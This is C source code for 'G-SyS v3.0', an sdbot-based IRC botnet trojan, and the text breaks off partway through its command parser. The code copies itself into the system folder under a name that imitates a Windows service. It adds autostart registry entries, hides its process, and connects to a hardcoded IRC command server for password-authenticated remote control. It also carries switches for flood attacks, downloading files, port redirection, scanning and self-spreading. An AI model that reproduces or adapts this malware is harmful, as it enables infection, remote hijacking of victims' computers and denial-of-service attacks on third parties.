////////////////////////////////////////////
//                                        //
//  [G-SyS](v3.0) by netw3rm and xyclone  //
//  Based on the sdbot by [sd]            //
//                                        //
////////////////////////////////////////////

 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
 #include <winsock.h>
 #include <wininet.h>
 #include <shellapi.h>
 #include <mmsystem.h>
// #include <fstream>
// #include <string>
 #define WIN32_LEAN_AND_MEAN

 //using namespace std;

// bot version (used in about/status/version reply)
 #define vername "3,1.3::9::00]9G-SySv3.0900[9::3::3."

// standard sdbot stuff
// #define NO_IDENT      // disables ident server
// #define NO_SPY        // disables irc spy function
// #define NO_UDP        // disables UDP functions
// #define NO_PING       // disables ping functions
// #define NO_NETINFO    // disables network info function
// #define NO_SYSINFO    // disables system info function
// #define NO_REDIRECT   // disables port redirect function
// #define NO_DOWNLOAD   // disables downloading/updating functions
// #define NO_VISIT      // disables visiting URLs
// #define NO_CONNCHECK  // disables check for internet connection

// [G-SyS](v3.0) specials ;)
// #define NO_SCAN       // disables the IP Scanner
#define NO_NBSCAN     // disables the NetBIOS Scanner/Spreader
#define NO_IMSPREAD   // disables IM spamming/spreading functions
#define NO_KUANG      // disables the kuang2 spreader
#define NO_SUB7		 // disables the SubSeven spreader
// #define NO_SYN        // disables the SYN attack and uses program syn.exe
 #define NO_BONK       // disables the BONK attack and uses program bonker.exe
 #define NO_JOLT       // disables the JOLT attack and uses program jolter.exe
 #define NO_IGMP       // disables the IGMP attack and uses program igmp.exe
// #define NO_SPREAD     // disables the SPECIAL spreding method and uses program espread.exe

// macro for predefined aliases. (these are just examples, you can change them to whatever you want)
 #define addpredefinedaliases() \
 	addalias("opme", "mode $chan +o $user"); \
 	addalias("smack", "action $chan smacks $1"); \
 	addalias("u1", "udp $1 10000 2048 50"); \
 	addalias("p2", "ping $1 10000 $2 50"); \
	addalias("ctcp", "raw PRIVMSG $1 :$chr(1)$2-$chr(1)");

// bot configuration
 const char botid[] = "G-SySv3.0"; // bot id
 const char password[] = "www.ryan1918.com"; // bot password
 const  int maxlogins = 2; // maximum number of simultaneous logins
 const char server[] = "protox.daemon.sh"; // server
 const  int port = 57469; // server port
 const char serverpass[] = ""; // server password
 const char channel[] = "www.ryan1918.com"; // channel that the bot should join
 const char chanpass[] = "www.ryan1918.com"; // channel password
 const char server2[] = ""; // backup server (optional)
 const  int port2 = 6667; // backup server port
 const char channel2[] = ""; // backup channel (optional)
 const char chanpass2[] = ""; // backup channel password (optional)
 const BOOL topiccmd = TRUE; // set to TRUE to enable topic commands
 const BOOL rndfilename = FALSE; // use random file name
 const char filename[] = "spoolsvc32.exe"; // destination file name
 const BOOL regrun = TRUE; // use the Run registry key for autostart
 const BOOL regrunservices = TRUE; // use the RunServices registry key for autostart
 const char valuename[] = "Windows Spool Services"; // value name for autostart
 const char prefix = '~'; // command prefix (one character max.)
 const char version[] = "3,1.3::9::00]9G-SySv3.0900[9::3::3. by netw3rm and xyclone."; // bot's VERSION reply
 const  int cryptkey = 0; // encryption key (not used right now)
 const  int maxaliases = 16; // maximum number of aliases (must be greater than the number of predefined aliases).

 #ifndef NO_SPREAD
 bool notSpreading = true;
 #endif

 #ifndef NO_IMSPREAD
 char IMmsg[] = "hey, download my irc trojan and infect yourself http://my.ip.org/irc_trojan.exe";
 #endif

// ping/udp structure.
 typedef struct ps {
	char host[128];
	char chan[128];
	int num;
	int size;
	int delay;
	int port;
	SOCKET sock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } ps;

// irc/spy structure.
 typedef struct ircs {
	char host[128];
	int port;
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	SOCKET sock;
	int spy;
	int threadnum;
	BOOL gotinfo;
 } ircs;

 #ifndef NO_REDIRECT
// redirect structure.
 typedef struct rs {
	char dest[128];
	int port;
	int lport;
	SOCKET sock;
	SOCKET csock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } rs;
 #endif

 #ifndef NO_DOWNLOAD
// download/update structure
 typedef struct ds {
	char url[256];
	char dest[256];
	char chan[128];
	SOCKET sock;
	int run;
	int threadnum;
	int update;
	BOOL silent;
	BOOL gotinfo;
 } ds;
 #endif

 #ifndef NO_VISIT
// visit structure
 typedef struct vs {
	 char host[128];
	 char referer[128];
	 char chan[128];
	 SOCKET sock;
	 BOOL silent;
	 BOOL gotinfo;
 } vs;
 #endif

// alias structure
 typedef struct as {
	 char name[24];
	 char command[160];
 } as;

#ifndef NO_SCAN
// scan structure
 typedef struct scans {
	IN_ADDR addy;
	char chan[128];
	int port;
	int delay;
	SOCKET sock;
	int threadnum;
	DWORD host;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;
	BOOL cgotinfo;
 } scans;
#endif

 #ifndef NO_PING
// icmp.dll typedefs/structs
 typedef unsigned long IPAddr;
 typedef struct ip_option_information {
 	unsigned char Ttl;
 	unsigned char Tos;
 	unsigned char Flags;
 	unsigned char OptionsSize;
 	unsigned char FAR *OptionsData;
 } IP_OPTION_INFORMATION, *PIP_OPTION_INFORMATION;
 typedef struct icmp_echo_reply {
 	IPAddr Address;
 	unsigned long Status;
 	unsigned long RoundTripTime;
 	unsigned short DataSize;
 	unsigned short Reserved;
 	void FAR *Data;
 	struct ip_option_information Options;
 } ICMP_ECHO_REPLY;

// kernel32.dll typedefs/structs
 typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
 } PROCESSENTRY32, *LPPROCESSENTRY32;

// icmp.dll function variables
 typedef int (__stdcall *ICF)(VOID);
 ICF fIcmpCreateFile;
 typedef int (__stdcall *ISE)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD);
 ISE fIcmpSendEcho;
 typedef int (__stdcall *ICH)(HANDLE);
 ICH fIcmpCloseHandle;
 #endif

// wininet.dll function variables
 typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
 IGCSE fInternetGetConnectedStateEx;
 typedef int (__stdcall *IGCS)(LPDWORD, DWORD);
 IGCS fInternetGetConnectedState;

// kernel32.dll function variables
 typedef int (__stdcall *RSP)(DWORD, DWORD);
 RSP fRegisterServiceProcess;
 typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
 CT32S fCreateToolhelp32Snapshot;
 typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
 P32F fProcess32First;
 typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
 P32N fProcess32Next;

// function prototypes (not really neccesary, but this way i can put the functions in any order i want)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 char * decryptstr(char *str, int strlen);
 void addlog(char *desc);
 int addalias(char *name, char *command);
 int addthread(char *desc);
 DWORD WINAPI irc_connect(LPVOID param);
 #ifndef NO_IDENT
 DWORD WINAPI ident(LPVOID user);
 #endif
 char * rndnick(char *strbuf);
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy);
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat);
 #ifndef NO_SPY
 int irc_spyparseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server);
 #endif
 void irc_send(SOCKET sock, char *msg);
 void irc_sendf(SOCKET sock, char *msg, char *str);
 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2);
 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice);
 char * replacestr(char *str, char *oldstr, char *newstr);
 #ifndef NO_UDP
 DWORD WINAPI udp(LPVOID param);
 #endif
 #ifndef NO_PING
 DWORD WINAPI ping(LPVOID param);
 #endif
 #ifndef NO_DOWNLOAD
 DWORD WINAPI webdownload(LPVOID param);
 #endif
 #ifndef NO_REDIRECT
 DWORD WINAPI redirect(LPVOID param);
 DWORD WINAPI redirectloop(LPVOID param);
 DWORD WINAPI redirectloop2(LPVOID param);
 #endif
 #ifndef NO_NETINFO
 char * netinfo(char *ninfo, char *host, SOCKET sock);
 #endif
 #ifndef NO_SYSINFO
 char * sysinfo(char *sinfo);
 int cpuspeed(void);
 unsigned __int64 cyclecount();
 #endif
 #ifndef NO_VISIT
 DWORD WINAPI visit(LPVOID param);
 #endif
 #ifndef NO_SCAN
 DWORD WINAPI ip_connect(LPVOID param);
 DWORD WINAPI ip_scan(LPVOID param);
 #endif
 #ifndef NO_IMSPREAD
 BOOL CALLBACK EnumAIMChild(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK EnumAIM(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK EnumMSNChild(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK EnumMSN(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK EnumYahooChild(HWND hwnd, LPARAM lParam);
 BOOL CALLBACK EnumYahoo(HWND hwnd, LPARAM lParam);
 #endif
 void uninstall(void);
 #ifndef NO_KUANG
 int KUANG(SOCKET sock);
 #endif
 #ifndef NO_SUB7
 int sub7(SOCKET sock);
 #endif

// global variables
 HANDLE ih;              // internet handle
 ircs mainirc;           // main irc structure
 char prefix1 = prefix;  // prefix variable
 HANDLE threads[64];     // thread handles
 char threadd[64][128];  // thread descriptions
 SOCKET csock[64];       // thread sockets
 char cnick[64][16];     // thread nicks
 char log[128][128];     // log entries
 DWORD w;                // DWORD used for various stuff
 as aliases[maxaliases]; // alias array
 int anum = 16;          // number of aliases
 BOOL success = FALSE;   // if true then we made successful connect attempt
 char tempdir[256];      // name of temp folder
 char pbuff[65500];      // packet buffer
 BOOL noicmp;            // if true, icmp.dll is available
 BOOL noigcse;           // if true, InternetGetConnectedStateEx function is available
 DWORD started;          // time bot was started

 // program starts here
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
	WSADATA wsadata;
	int i = 0, err = 0;
	HKEY key;
	char cfilename[256];
	char filename1[64];
	char sysdir[256];
	char tstr[256];
	DWORD cstat;
    HANDLE psnap;
    PROCESSENTRY32 pe32 = {0};
	int copies = 0;
	BOOL bkpserver = FALSE;
	BOOL noigcs;

	// record start time
	started = GetTickCount() / 1000;

	#ifndef NO_PING
	// load icmp.dll functions
 	HINSTANCE icmp_dll = LoadLibrary("ICMP.DLL");
    if (icmp_dll == 0) noicmp = TRUE;
 	else {
	 	fIcmpCreateFile  = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho    = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");
 		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho) {
	        noicmp = TRUE;
	    }
	}
	#endif

	#ifndef NO_IMSPREAD
	EnumWindows(EnumMSN, 0);
	EnumWindows(EnumAIM, 0);
	EnumWindows(EnumYahoo, 0);
	#endif

	// load functions from kernel32.dll and hide from the windows 9x task manager
	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) {
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");

		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1);
	}

	// initialize wininet stuff
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;
	// see if InternetGetConnectedStateEx is available
	HINSTANCE wininet_dll = LoadLibrary("WININET.DLL");
    if (wininet_dll == 0) noigcse = TRUE;
 	else {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
		if (!fInternetGetConnectedState) {
			noigcs = TRUE;
		} else noigcs = TRUE;

	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if (!fInternetGetConnectedStateEx) {
	        noigcse = TRUE;
	    } else noigcse = FALSE;
	}

	// get our file name and the path to the temp folder
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	// check if this exe is running already
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		psnap = fCreateToolhelp32Snapshot(2, 0);
		if (psnap != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(psnap, &pe32)) {
				do {
					if (strncmp(cfilename+(strlen(cfilename)-strlen(pe32.szExeFile)), pe32.szExeFile, strlen(pe32.szExeFile)) == 0) copies++;
				} while (fProcess32Next(psnap, &pe32));
			}
			CloseHandle (psnap);
			// if this exe has already been run, then exit
			if (copies > 1) exit(0);
		}
	}

	err = WSAStartup(MAKEWORD(1, 1), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 1 || HIBYTE( wsadata.wVersion ) != 1 ) {
		WSACleanup();
		return 0;
	}


	srand(GetTickCount());
	if (rndfilename) rndnick((char *)&filename); else strncpy(filename1, filename, sizeof(filename1)-1);

	GetSystemDirectory(sysdir, sizeof(sysdir));
	if (strstr(cfilename, sysdir) == NULL) {
		Sleep(1000);
		// loop until the file is copied.
		sprintf(tstr, "\\%s", filename1);
		while (CopyFile(cfilename, strcat(sysdir, tstr), FALSE) == FALSE) Sleep(2000);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		WSACleanup();
		if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) exit(0);
	}


	if (regrun) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
		RegCloseKey(key);
	}

	if (regrunservices) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
		RegCloseKey(key);
	}

	DWORD hideIt = 2;
	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, "Hidden", 0, REG_DWORD, (LPBYTE)&hideIt, sizeof(DWORD));
	RegCloseKey(key);

	memset(threadd, 0, sizeof(threadd));
	memset(cnick, 0, sizeof(cnick));
	memset(aliases, 0, sizeof(aliases));

	addthread("main thread");

	// remove the following line if you don't want any predefined aliases
	addpredefinedaliases();

	memset(log, 0, sizeof(log));
	addlog("bot started.");

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CHECKCONNECTION
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!noigcs) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			err = irc_connect((void *)&mainirc);
			success = FALSE;
			if (err == 2) break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();

	return 0;
 }

// simple decrypt function, for encrypted strings
 char * decryptstr(char *str, int strlen)
 {
	if (cryptkey != 0) for (BYTE i = 0; i < strlen; i++) str[i] = str[i] ^ (cryptkey + (i * (cryptkey % 10) + 1));
	return str;
}

// function to add a log item
 void addlog(char *desc)
 {
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (int i = 126; i >= 0; i--) if (log[i][0] != '\0') strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	sprintf(log[0], "[%d-%d-%d %d:%d:%d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);
 }

// function to add an alias and return alias number
 int addalias(char *name, char *command)
 {
	int i;
	for (i = 0; i < maxaliases; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
 }

// function to add description to thread list and return thread number
 int addthread(char *desc)
 {
	int i;
	for (i = 0; i < 64; i++) {
		if (threadd[i][0] == '\0') {
			strncpy(threadd[i], desc, sizeof(threadd[i])-1);
			break;
		}
	}
	return i;
 }

// connect function used by the original bot and all clones/spies
 DWORD WINAPI irc_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	DWORD err;
	int rval;
	char nick[16];
	char *nick1;
	char str[64];
	BYTE spy;
	ircs irc;

	irc = *((ircs *)param);
	ircs *ircp = (ircs *)param;
	ircp->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(irc.port);
		iaddr.s_addr = inet_addr(irc.host);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(irc.host);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) return 0;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		memset(nick, 0, sizeof(nick));
		if (irc.spy == 1) nick1 = irc.nick; else {
			nick1 = rndnick(nick);
		}

		#ifndef NO_IDENT
		CreateThread(NULL, 0, &ident, NULL, 0, &err);
		#endif

		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		csock[irc.threadnum] = sock;
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		}

		sprintf(str, "connected to %s.", irc.host);
		addlog(str);

		strncpy(cnick[irc.threadnum], nick1, sizeof(cnick[irc.threadnum])-1);

		if (irc.spy == 1) spy = 1; else spy = 0;
		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, spy);
		closesocket(sock);

		if (rval == 0) continue;
		if (rval == 1) {
			Sleep(1800000);
			continue;
		}
		if (rval == 2) break;
	}

	threads[irc.threadnum] = 0;
	threadd[irc.threadnum][0] = '\0';
	cnick[irc.threadnum][0] = '\0';
	return rval;
 }

 #ifndef NO_IDENT
// ident server
 DWORD WINAPI ident(LPVOID param)
 {
	SOCKET isock, csock;
	SOCKADDR_IN issin, cssin;
	char user[12];
	char ibuff[32];

	isock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); // set isock to standard TCP socket
	WSAAsyncSelect(isock, 0, WM_USER + 1, FD_READ); // set async mode for isock
	memset(&issin, 0, sizeof(issin));
	issin.sin_family = AF_INET; // AF_INET is currently the only supported family
	issin.sin_port = htons(113); // set ident port
	bind(isock, (SOCKADDR *)&issin, sizeof(issin)); // bind issin to isock

	while(1) { // loop forever
		if (listen(isock, 10) == SOCKET_ERROR) return 0; // listen for connection. if we get SOCKET_ERROR, then something's wrong and so we return
		csock = accept(isock, (SOCKADDR *)&cssin, NULL); // try to accept a connection
		if (csock != INVALID_SOCKET) break; // if INVALID_SOCKET is returned, then we don't have a connection. otherwise, we're connected, so break
	}

	memset(user, 0, sizeof(user));
	srand(GetTickCount());
	rndnick(user);

	memset(ibuff, 0, sizeof(ibuff));
	sprintf(ibuff, "%d, %d : USERID : UNIX : %s\r\n", rand()%6000+1, port, (char *)user); // build ident reply
	send(csock, ibuff, strlen(ibuff), 0);

	// we're done, so let's close our sockets and return
	closesocket(csock);
	closesocket(isock);

	return 0;
 }
 #endif

 char * rndnick(char *strbuf)
 {
	int n, nl;
	char nick[12];

	srand(GetTickCount());
	memset(nick, 0, sizeof(nick));
	nl = (rand()%3)+4;
	for (n=0; n<nl; n++) nick[n] = (rand()%26)+97;
	nick[n+1] = '\0';
	strncpy(strbuf, nick, 12);
	return strbuf;

 }

// receive loop for bots/spies
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy)
 {
	// main receive buffer
	char buff[4096];
	int err, repeat;
	char masters[maxlogins][128];
	char *b;
	char str[8];
	char login[64];
	char line[512];
	int in_channel;

	for(repeat = 0; repeat < maxlogins; repeat++)
        strcpy(masters[repeat], "\0");
	repeat = 0;
//	memset(master, 0, sizeof(master));


	if (serverpass[0] != '\0') {
		sprintf(login, "PASS %s\r\n", serverpass);
		send(sock, login, strlen(login), 0);
	}
	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str), nick1);
	err = send(sock, login, strlen(login), 0);
	if (err == SOCKET_ERROR) {
		closesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		char host[160];

		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		// if recv() returns 0, that means that the connection has been lost.
		if (err == 0) break;
		// if recv() returns SOCKET_ERROR then we've probably terminated the connection.
		if (err == SOCKET_ERROR) break;

		// split lines up if multiple lines received at once, and parse each line
		memset(line, 0, sizeof(line));
		b = strtok(buff, "\r");
		if (b != NULL) strncpy(line, b, sizeof(line)-1);
		while (b != NULL) {
			#ifndef NO_SPY
			if (spy == 1) repeat = irc_spyparseline(line, sock, channel, chanpass, nick1, hsock, hchannel, server);
			#endif
			if (spy == 0) {
				repeat = 1;
				do {
					// repeat--;
					repeat = irc_parseline(line, sock, channel, chanpass, nick1, server, masters, host, &in_channel, repeat);
					repeat--;
				} while (repeat > 0);
				//if (repeat-- > 0) while (repeat-- > 0) irc_parseline(b[n-1], sock, channel, chanpass, nick1, in_channel, repeat);
				if (repeat == -1) return 0;
				else if (repeat == -2) return 1;
				else if (repeat == -3) return 2;
			}

			b = strtok(b+strlen(b)+1, "\r");
			if (b != NULL) if (b[strlen(b)+2] != '\n' && b[strlen(b)+3] != '\0') strncpy(line, b+1, sizeof(line)-1); else b = NULL;
		}
	}

	return 0;
 }

// function to parse lines for the bot and clones
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat)
 {
	char line1[512];
	char line2[512];
	BOOL ismaster;
	char ntmp[12];
	char ntmp2[3];
	int i, ii, s;
	char *a[32];
	char a0[128];
	char nick[16];
	char user[24];
	char sendbuf[512];
	DWORD id;
	BOOL silent = FALSE;
	BOOL notice = FALSE;
	BOOL usevars = FALSE;
	int cl;
	
	memset(sendbuf, 0, sizeof(sendbuf));

	id = 0;
	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) return 1;
	if (strcmp("JOIN", a[1]) == 0) return 1;
	//check for 'silent' parameter
	for (i = 3; i < 32; i++) if (a[i] == NULL && a[i-1] != NULL) {
		if (strcmp(a[i-1], "-s") == 0) silent = TRUE;
		break;
	}

	//check for 'notice' parameter
	for (i = 3; i < 32; i++) if (a[i] == NULL && a[i-1] != NULL) {
		if (strcmp(a[i-1], "-n") == 0) notice = TRUE;
		break;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}


	// pong if we get a ping request from the server 
   if (strcmp("PING", a[0]) == 0) { 
      //irc_sendf(sock, "PONG %s\r\n", a[1]+1); 
      irc_sendf(sock, "PONG %s\r\n", a[1]); 
      if (in_channel == 0) { 
         irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass); 
      } 
      return 1; 
   } 

   if (strcmp("NOTICE", a[1]) == 0) { 
      if (a[18]) 
      { 
         if (strcmp("pong", a[17]) == 0) 
         { 
            irc_sendf(sock, "PONG %s\r\n", a[18]); 
            //irc_sendf(sock, "PONG %s\r\n", a[1]); 
            if (in_channel == 0) { 
               irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass); 
            } 
         } 
      } 
      return 1; 
   }
	// check if user is logged in
	ismaster = FALSE;
	for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a0) == 0) ismaster = TRUE;
	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) notice = TRUE;
			if (a[2] == NULL) return 1;
			if (strstr(a[2], "#") == NULL || notice) a[2] = user;
			if (a[3] == NULL) return 1; 
			a[3]++;
			if (a[3] && nick1) if (strncmp(nick1, a[3], strlen(nick1)) == 0) s = 4; else s = 3; 
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (strncmp(nick, a[3], strlen(nick)) == 0) s = 4; else s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			if (strcmp("\1VERSION\1", a[s]) == 0) if (a[2][0] != '#' && version[0] != '\0') {
				irc_sendf2(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)version);
				return 1;
			}
			else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL && a[2][0] != '#') {
				irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
				return 1;
			}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		if (a[s]++[0] != prefix1) return 1;
		// see if someone is logging in
		if (strcmp("login", a[s]) == 0 || strcmp("l", a[s]) == 0) {
			// make sure that user isn't already logged in
			if (ismaster || a[2] == user ) return 1;
			for (i = 0; i < maxlogins; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "3,1.3::9::00]User authorization complete.0]", notice);
					char *u = strtok(a[0], "!") + 1;
					char *h = strtok(NULL, "\0");
					sprintf(sendbuf, "user %s(%s) logged in.", u, h);
					addlog(sendbuf);
					break;
				}
			}
			return 1;
		}
		if (ismaster || strcmp("332", a[1]) == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix1;
					sc[3] = prefix1;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix1 || usevars) {
